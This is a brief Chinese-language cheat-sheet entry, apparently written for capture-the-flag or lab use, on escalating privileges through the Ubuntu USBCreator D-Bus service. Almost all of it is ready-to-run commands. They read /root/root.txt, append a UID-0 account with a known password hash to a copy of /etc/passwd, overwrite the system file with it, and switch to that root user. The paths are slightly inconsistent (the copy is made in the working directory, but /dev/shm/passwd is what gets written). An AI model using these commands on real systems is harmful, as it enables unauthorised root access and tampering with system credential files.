# com.ubuntu.USBCreator.conf

要求具有sudo组以及同等效力组\
将一个已知文件的内容，投射到一个不存在的文件\
而后我们查看，发现这个文件会被创建

1. 读取：

```bash
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /dev/shm/dashabi true
```

1. 写入root用户

```bash
cp /etc/passwd passwd //靶机执行
openssl passwd -1 rong //本机
echo 'rong:$1$7P/yeC8J$z2eywF.JUPm21Dx0IqVEp.:0:0:pwned:/root:/bin/bash' >> passwd 
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/passwd /etc/passwd true
su rong
```
